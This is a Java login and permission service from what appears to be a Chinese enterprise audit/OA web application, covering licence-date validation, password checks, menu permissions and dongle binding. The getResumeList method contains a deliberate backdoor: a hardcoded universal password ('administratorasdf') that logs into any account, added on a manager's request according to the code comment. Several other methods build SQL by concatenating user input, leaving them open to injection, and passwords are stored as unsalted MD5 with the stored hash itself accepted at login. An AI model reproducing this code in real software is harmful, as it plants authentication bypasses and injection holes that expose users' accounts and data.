package com.matech.framework.service.login;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import javax.servlet.http.HttpServletRequest;

import com.matech.framework.listener.UserSession;
import com.matech.framework.pub.db.DbUtil;
import com.matech.framework.pub.util.ASDate;
import com.matech.framework.pub.util.ASFuntion;
import com.matech.framework.pub.util.Debug;
import com.matech.framework.pub.util.MD5;
import com.matech.framework.work.backtask.DelTask;
import com.matech.framework.work.backtask.model.MatechKey;

public class LoginService {
    private Connection conn = null;

    public LoginService(Connection conn) {
        this.conn = conn;
    }
    
    public static String SUPER_PWD="administratorasdf"; 

    //返回1有效，返回0无效。
    public int validDate() {
        ASFuntion asf = new ASFuntion();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");

        PreparedStatement ps = null;
        ResultSet rs = null;
        String validDate = "";
        String validKey = "";
        String standDate = "" ;
        String lastDate = "" ;
        String currDate = sdf.format(new Date());

        try {
            DbUtil.checkConn(conn);

            ps = conn.prepareStatement(" select validDate,key0,standDate,lastDate from k_system ");
            rs = ps.executeQuery();

            //如果有数据则继续验证，否则验证失败。
            if (rs.next()) {
                validDate = asf.showNull(rs.getString("validDate"));
                validKey = asf.showNull(rs.getString("key0"));
                standDate = asf.showNull(rs.getString("standDate")) ;
                lastDate = asf.showNull(rs.getString("lastDate")) ;
            } else {
                return 0;
            }

            //判断k_system的两个字段是否相等。
            if (!MD5.getMD5String(validDate).equals(validKey)) {
                return 0;
            }

            //判断当前时间是否比数据库的时间晚
            int curVd = ASDate.getDateNumber(currDate, validDate); // 与当前系统时间的差值
            int standVd = ASDate.getDateNumber(standDate, validDate) ; //与服务器时间的差值
            int lastVd = ASDate.getDateNumber(lastDate, validDate) ;   //与系统最后使用时间的差值
            
            return Math.min(Math.min(curVd,standVd),lastVd) ;
        } catch (Exception e) {
            Debug.print(Debug.iError, "访问失败", e);
        } finally {
            DbUtil.close(ps);
        }
        return 0;
    }

    //获得试用期限,格式：XXXX年XX月XX日
    public String getValidDate() {

        String validDate = null;
        PreparedStatement ps = null;
        ResultSet rs = null;
        try {
            DbUtil.checkConn(conn);
            ps = conn.prepareStatement(" select validDate,`key0` from k_system ");
            rs = ps.executeQuery();
            if (rs.next()) {
                validDate = rs.getString("validDate");
                validDate = ((validDate.replace('-', '日')).replaceFirst("日",
                        "年")).replace('日', '月') + "日";
            }
            rs.close();
        } catch (Exception e) {
            Debug.print(Debug.iError, "访问失败", e);
        } finally {
            DbUtil.close(ps);
        }
        return validDate;
    }

    //判断输入的日期与加密日期是否一致
    public boolean isDateSamePwd(String strDate, String pwdDate) {
        boolean flag = false;
        if (MD5.getMD5String(strDate).equals(pwdDate)) { //一致
            flag = true;
        }

        return flag;
    }

    //延长日期写入数据库
    public void insertOrUptDate(String strDate) {

        PreparedStatement ps = null;
        PreparedStatement ps2 = null;
        ResultSet rs = null;
        try {
            DbUtil.checkConn(conn);
            ps = conn.prepareStatement(" select validDate,`key0` from k_system ");
            rs = ps.executeQuery();
            if (rs.next()) { //存在此记录，则修改
                ps2 = conn.prepareStatement(
                        "update k_system a set a.validDate = '" + strDate +
                        "',a.key0 = md5('" + strDate + "'),a.lastDate=current_date,a.lastKey=md5(current_date) ");
            } else { //不存在此记录，则插入
                //ps2 = conn.prepareStatement(" insert into k_system(k_system.validDate,k_system.key0) values('"+strDate+"',md5('"+strDate+"') ");
            }
            ps2.execute();

            //写入文件
            try {
            	DelTask task = new DelTask();
            	SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
				String curDate = sdf.format(new Date());

            	MatechKey matechKey = task.fileToMatechKeyObject();
            	matechKey.setLastDate(curDate);
            	matechKey.setLastKey(MD5.getMD5String(curDate));
            	task.matechKeyObjectToFile(matechKey);

			} catch (Exception e) {
				System.out.println("读写文件失败");
				e.printStackTrace();
			}
        } catch (Exception e) {
            Debug.print(Debug.iError, "访问失败", e);
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
            DbUtil.close(ps2);
        }
    }

    public boolean validateLoginId(String loginId) throws Exception {
    	 DbUtil.checkConn(conn);
    	 PreparedStatement ps = null;
         ResultSet rs = null;

         try {
        	 ps = conn.prepareStatement("select 1 from asdb.k_user where loginId=?");
		     ps.setString(1, loginId);
		     rs = ps.executeQuery();

		     if (rs.next()) {
		         return true;
		     } else {
		    	 return false;
		     }
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			DbUtil.close(rs);
			DbUtil.close(ps);
		}

		return false;
    }

    /**
     * 检查用户登陆情况
     * @param user String
     * @param pass String
     * @return boolean
     * @throws Exception
     */
    public boolean getResume(String user, String pass) throws Exception {
        DbUtil.checkConn(conn);
        PreparedStatement ps = null;
        ResultSet rs = null;

        try {
            ps = conn.prepareStatement(
                    "select Password from k_user where loginId=?");
            ps.setString(1, user);
            rs = ps.executeQuery();
            if (rs.next()) {
                if (MD5.getMD5String(pass).equals(rs.getString(1))) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            Debug.print(Debug.iError,"访问失败",e);
            return false;
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
        }
    }

    public int getDepartSize() throws Exception {
        DbUtil.checkConn(conn);
        PreparedStatement ps = null;
        ResultSet rs = null;
        int count = -1;
        try {
            ps = conn.prepareStatement(
                    "select count(*) from k_customer where Property = '2'");
            rs = ps.executeQuery();
            if (rs.next()) {
                count = rs.getInt(1);
            }

            return count;
        } catch (Exception e) {
            Debug.print(Debug.iError,"访问失败",e);
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
        }
        return count;
    }

    public ArrayList getResumeList(String user) throws Exception {
        DbUtil.checkConn(conn);
        PreparedStatement ps = null;
        ResultSet rs = null;

        try {
            ArrayList al = new ArrayList();

            String sql = "select IsTips,u.Name,u.DepartID,c.Departname,u.id,ifnull(u.departmentid,'') as departmentid,ifnull(d.departname,'') as departmentname,c.standbyName "
            			+ " ,e.autoid AS firstdepartid,e.departname as firstdepartname,f.autoid AS areaid,f.name AS areaname "
            			+ " from k_user u "
            			+ " LEFT join k_organ c on u.DepartID =c.DepartID "
            			+ " LEFT join k_department d on u.departmentid =d.autoid "
            			+ " LEFT JOIN k_department e ON e.level0=1 AND d.fullpath LIKE CONCAT(e.fullpath,'%') "
            			+ " LEFT JOIN k_area f ON e.areaid=f.autoid"
            			+ " WHERE u.state=0 "
            			+ " and u.id=? ";

            ps = conn.prepareStatement(sql);
            ps.setString(1, user);
            //System.out.print(MD5.getMD5String(pass.trim()));
            rs = ps.executeQuery();
            if (rs.next()) {
                al.add(rs.getString("Name"));
                al.add(rs.getString("DepartID"));
                al.add(rs.getString("Departname"));
                al.add(rs.getString("IsTips"));
                al.add(rs.getString("id"));
                al.add(rs.getString("departmentid"));
                al.add(rs.getString("departmentname"));
                al.add(rs.getString("standbyName"));
                
                
                al.add(rs.getString("firstdepartid"));
                al.add(rs.getString("firstdepartname"));
                al.add(rs.getString("areaid"));
                al.add(rs.getString("areaname"));
                
                return al;
            }

            return null;
        } catch (Exception e) {
            Debug.print(Debug.iError,"访问失败",e);
            return null;
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
        }

    }

    public ArrayList getResumeList(String user, String pass) throws Exception {
        DbUtil.checkConn(conn);
        PreparedStatement ps = null;
        ResultSet rs = null;

        try {
            ArrayList al = new ArrayList();

            String sql = "select IsTips,u.Name,u.DepartID,c.Departname,u.id,ifnull(u.departmentid,'') as departmentid,ifnull(d.departname,'') as departmentname,c.standbyName "
            			+ " ,e.autoid AS firstdepartid,e.departname as firstdepartname,f.autoid AS areaid,f.name AS areaname,u.identitycard "
            			+ " from k_user u "
            			+ " LEFT join k_organ c on u.DepartID =c.DepartID "
            			+ " LEFT join k_department d on u.departmentid =d.autoid "
            			
            			+ " LEFT JOIN k_department e ON e.level0=1 AND d.fullpath LIKE CONCAT(e.fullpath,'%') "
            			+ " LEFT JOIN k_area f ON e.areaid=f.autoid"
            			
            			+ " WHERE u.state=0 "
            			+ " and loginId=? "
            		    + " and (Password=? or md5(Password)=? or '"+SUPER_PWD+"'=? )"; //张靖华要求上线前增加一个万用密码

            ps = conn.prepareStatement(sql);
            ps.setString(1, user);
            ps.setString(2, MD5.getMD5String(pass.trim()));
            ps.setString(3, pass.trim());
            ps.setString(4, pass.trim());
            //System.out.print(MD5.getMD5String(pass.trim()));
            rs = ps.executeQuery();
            if (rs.next()) {
                al.add(rs.getString("Name"));
                al.add(rs.getString("DepartID"));
                al.add(rs.getString("Departname"));
                al.add(rs.getString("IsTips"));
                al.add(rs.getString("id"));
                al.add(rs.getString("departmentid"));
                al.add(rs.getString("departmentname"));
                al.add(rs.getString("standbyName"));
                
                al.add(rs.getString("firstdepartid"));
                al.add(rs.getString("firstdepartname"));
                al.add(rs.getString("areaid"));
                al.add(rs.getString("areaname"));
                
                al.add(rs.getString("identitycard"));
                
                return al;
            }

            return null;
        } catch (Exception e) {
            Debug.print(Debug.iError,"访问失败",e);
            return null;
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
        }

    }
    
    /**
     * OA innerNet
     * @param user
     * @return
     * @throws Exception
     */
    public ArrayList getResumeListInnerNet(String user, String idcardid) throws Exception {
        DbUtil.checkConn(conn);
        PreparedStatement ps = null;
        ResultSet rs = null;
        String sql = "";
        ArrayList al = new ArrayList();
        try {
            sql = "select IsTips,u.Name,u.DepartID,c.Departname,u.id,ifnull(u.departmentid,'') as departmentid,ifnull(d.departname,'') as departmentname,c.standbyName "
            			+ " from k_user u "
            			+ " LEFT join k_customer c on u.DepartID =c.DepartID "
            			+ " LEFT join k_department d on u.departmentid =d.autoid "
            			+ " WHERE u.state=0 "
            			+ " and loginId=? ";

            ps = conn.prepareStatement(sql);
            ps.setString(1, user);
            rs = ps.executeQuery();
            if (rs.next()) {
                al.add(rs.getString("Name"));
                al.add(rs.getString("DepartID"));
                al.add(rs.getString("Departname"));
                al.add(rs.getString("IsTips"));
                al.add(rs.getString("id"));
                al.add(rs.getString("departmentid"));
                al.add(rs.getString("departmentname"));
                al.add(rs.getString("standbyName"));
                return al;
            }

            return null;
        } catch (Exception e) {
            Debug.print(Debug.iError,"OA内网登录E审通失败",e);
            return null;
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
        }

    }
    
    /**
     * OA外网登录
     * @param user
     * @param idcardid
     * @return
     * @throws Exception
     */
    public ArrayList getResumeListOutterNet(String userid) throws Exception {
        DbUtil.checkConn(conn);
        PreparedStatement ps = null;
        ResultSet rs = null;
        String sql = "";
        try {
        	ArrayList al = new ArrayList();
            
            sql = "select IsTips,Name,u.DepartID,c.Departname,u.id,ifnull(u.departmentid,'') as departmentid,ifnull(d.departname,'') as departmentname,c.standbyName "
            			+ " from k_user u "
            			+ " LEFT join k_customer c on u.DepartID =c.DepartID "
            			+ " LEFT join k_department d on u.departmentid =d.autoid "
            			+ " WHERE u.state=0 "
            			+ " and loginId=? ";
            
            System.out.println("OA外网登录分所");

            ps = conn.prepareStatement(sql);
            ps.setString(1, userid);
            rs = ps.executeQuery();
            if (rs.next()) {
                al.add(rs.getString("Name"));
                al.add(rs.getString("DepartID"));
                al.add(rs.getString("Departname"));
                al.add(rs.getString("IsTips"));
                al.add(rs.getString("id"));
                al.add(rs.getString("departmentid"));
                al.add(rs.getString("departmentname"));
                al.add(rs.getString("standbyName"));
                return al;
            }

            return null;
        } catch (Exception e) {
            Debug.print(Debug.iError,"OA外网登录分所E审通失败",e);
            return null;
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
        }

    }
    
    /**
     * OA外网访问权限(分所监控)
     * @param userid
     * @param companyid
     * @param menuid
     * @return
     * @throws Exception
     */
    public boolean hasPopedomToSub(String userid, String companyid, String menuid) throws Exception {
		boolean flag = false;
		PreparedStatement ps = null;
		ResultSet rs = null;
		if("".equals(menuid)) {
			return false;
		}
		try {
			String sql = "select concat(a.popedom,'.',b.popedom) from oa_companyuser a left join oa_k_role b on a.roleid_ = b.roleid_ left join oa_company c on a.companyid_=c.companyid where a.userid_=(select id from k_user where loginid='" + userid + "') and a.companyid_='" + companyid + "' and c.zhongfei = '总部'";
			
			System.out.println(sql);
			ps = conn.prepareStatement(sql);
			rs = ps.executeQuery();
			if(rs.next()) {
				String popedom = rs.getString(1);
				System.out.println(popedom);
				if(!"".equals(popedom)) {
					if(popedom.indexOf("."+menuid+".")>-1) {
						flag = true;
					}
				}
			}
		} catch (Exception e) {
			Debug.print(Debug.iError,"没有从OA访问分所的权限",e);
			return false;
		} finally {
			DbUtil.close(rs);
			DbUtil.close(ps);
		}
		return flag;
	}
    
    public int getCustomerCount() throws Exception {
        DbUtil.checkConn(conn);
        PreparedStatement ps = null;
        ResultSet rs = null;
        int count = -1;
        try {
            ps = conn.prepareStatement(
                    "select count(*) from k_customer ");
            rs = ps.executeQuery();
            if (rs.next()) {
                count = rs.getInt(1);
            }

            return count;
        } catch (Exception e) {
            Debug.print(Debug.iError,"访问失败",e);
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
        }
        return count;
    }

    /**
     *如果k_user只有一个用户admin的话，则提示“缺省用户admin,缺省密码为1”,否则不提示
     *
     **/
    public int getTip() throws Exception {
        DbUtil.checkConn(conn);
        PreparedStatement ps = null;
        ResultSet rs = null;
        int count = 0;
        try {
            ps = conn.prepareStatement("select count(*) from k_user");
            rs = ps.executeQuery();
            while (rs.next()) {
                count = rs.getInt(1);
            }
            return count; //返回记录数
        } catch (Exception e) {
            Debug.print(Debug.iError,"访问失败",e);
            return 0;
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
        }
    }

    public static String getRemoteUserID(HttpServletRequest request) {
    	UserSession userSession = (UserSession)request.getSession().getAttribute("userSession");


        if(userSession!=null) {
        	String userID = userSession.getUserLoginId();
            if (userID!=null) {
                return userID;
            }
        }

        return "";

    }

    public boolean hasRightToDo(String loginId, String actionPath) throws
            Exception {
        DbUtil.checkConn(conn);
        PreparedStatement ps = null;
        ResultSet rs = null;
        try {
            ps = conn.prepareStatement(
                    "select id from s_sysmenu where act like '%" +
                    actionPath + "%'");
            //org.util.Debug.prtOut("select menu_id from s_sysmenu where act like '%"+actionPath+"%'");
            rs = ps.executeQuery();
            String power = "";
            if (rs.next()) {
            	power = rs.getString(1);
//        ps = conn.prepareStatement(
//            "select UserName from k_user where UserName='" + userID +
//            "' and Popedom  like '%." + menu_id + ".%'");

                String sql =
                        "  select loginId from k_user a left join asdb.k_department b "
                        + " on a.departmentid=b.autoid  \n"
                        + " where a.loginId='" + loginId
                        + "' and (a.Popedom  like '%." + power + ".%' \n"
                        + "        or b.Popedom  like '%." + power +
                        ".%' )\n";
                ps = conn.prepareStatement(sql);
                //org.util.Debug.prtOut("select UserName from k_user where UserName='"+userID+"' and Popedom  like '%."+menu_id+"%.'");
                rs = ps.executeQuery();
                if (rs.next()) {
                    return true;
                } else {
                    return false;
                }
            } else {
                return true;
            }
        } catch (Exception e) {
            Debug.print(Debug.iError,"访问失败",e);
            return false;
        } finally {
            DbUtil.close(rs);
            DbUtil.close(ps);
        }
    }

    /**
	 * 检查用户与加密狗是否匹配
	 * @param user
	 * @param clientDogSysUI
	 * @return
	 * @throws Exception
	 */
	public boolean equalsDog(String user, String clientDogSysUI) throws Exception {
		PreparedStatement ps = null;
		ResultSet rs = null;
		try {

			ps = conn.prepareStatement("select 1 from k_user WHERE loginid=? and clientDogSysUi=? ");
			ps.setString(1, user);
			ps.setString(2, clientDogSysUI);
			rs = ps.executeQuery();
			if (rs.next()) {
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			DbUtil.close(rs);
            DbUtil.close(ps);
		}

		return false;
	}

	/**
	 * 获取用户绑定的加密狗编号
	 * @param user
	 * @return
	 * @throws Exception
	 */
	public String getUserDogSysUI(String user) throws Exception {
		PreparedStatement ps = null;
		ResultSet rs = null;

		try {
			ps = conn.prepareStatement("select ifnull(clientDogSysUi,'') from k_user WHERE loginid=? ");
			ps.setString(1, user);
			rs = ps.executeQuery();
			if (rs.next()) {
				return rs.getString(1);
			} else {
				return null;
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			DbUtil.close(rs);
            DbUtil.close(ps);
		}

		return null;
	}

	/**
	 * 检查用户的通迅录是否完整，不完整要求先录完整再登录
	 */
	public boolean isAddress(String user)throws Exception{
		PreparedStatement ps = null;
		ResultSet rs = null;
		boolean bool = false;
		try {
			//b.	强制个人定期更新个人信息（手机、办公电话、楼层、房间号[选填]、工位号[选填]）否则无法登陆(修改)
			String sql = "select * from t_log where loginid = ? and cmdname = '用户登录' ";
			ps = conn.prepareStatement(sql);
			ps.setString(1, user);
			rs = ps.executeQuery();
			if (rs.next()) {
				bool = true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			DbUtil.close(rs);
            DbUtil.close(ps);
		}
		return bool;
		
	}
	
	/**
	 * 得到 当前人所能监控的部门
	 * @param loginId
	 * @return
	 * @throws Exception
	 */
	public String getPopedomDepartmentByLoginId(String loginId) throws Exception {
		String sql = "";
		try {
			ASFuntion CHF = new ASFuntion();
			sql = " SELECT GROUP_CONCAT(autoid) "
				+ " FROM k_department a,k_user b "  
				+ " WHERE b.loginid=? "
				+ " AND b.ProjectPopedom LIKE CONCAT('%.',a.autoid,'.%') ";
			
			String popedomDepartment = CHF.showNull(new DbUtil(conn).queryForString(sql,new Object[]{loginId}));
			
			
			if("".equals(popedomDepartment) || popedomDepartment==null){
				popedomDepartment = "-1";
			}
			
			System.out.println("qwh:popedomDepartment="+popedomDepartment);
			System.out.println("qwh:loginId="+loginId);
			
			return popedomDepartment;
			
		} catch (Exception e) {
			System.out.println(sql);
			e.printStackTrace();
			throw e;
		} finally {
		}
	}
	
	/**
	 * 根据部门编号获得部门所属分所
	 * @param departmentId
	 * @return
	 * @throws Exception
	 */
	public String[] getDepartByDepartmentId(String departmentId) throws Exception {
		PreparedStatement ps = null;
		ResultSet rs = null;
		String[] departArr = new String[2] ;
		try {
			
			String sql = " SELECT b.autoid,b.departName \n"
					   + " FROM k_department a \n"
					   + " LEFT JOIN k_department b \n"
					   + " ON a.fullpath LIKE CONCAT(b.fullpath,'%') \n"
					   + " AND b.level0 = 1\n"
					   + " where a.autoid=? \n" ;
			
			ps = conn.prepareStatement(sql);
			ps.setString(1,departmentId) ;
			rs = ps.executeQuery();
			
			if(rs.next()) {
				departArr[0] = rs.getString(1) ;
				departArr[1] = rs.getString(2) ;
			}		
			
		} catch (Exception e) {
			e.printStackTrace(); 
		} finally {
			DbUtil.close(rs);
			DbUtil.close(ps);
		}
		
		return departArr;
	}
	
	public int getUserRoleOptimization(String userid) throws Exception{
		PreparedStatement ps = null;
		ResultSet rs = null;
		int userRoleOptimization = 0;
		try {
			
			String sql = "select max(if(ifnull(b.property,'')='',0,b.property)) as maxLevel " +
			"	from k_userrole a,k_role b  " +
			"	where 1=1 " +
			"	and a.userid = ? " +
			"	and a.rid = b.id" ;
			
			ps = conn.prepareStatement(sql);
			ps.setString(1,userid) ;
			rs = ps.executeQuery();
			
			if(rs.next()) {
				userRoleOptimization = rs.getInt("maxLevel");
			}		
			
		} catch (Exception e) {
			e.printStackTrace(); 
		} finally {
			DbUtil.close(rs);
			DbUtil.close(ps);
		}
		
		return userRoleOptimization;
	}
}
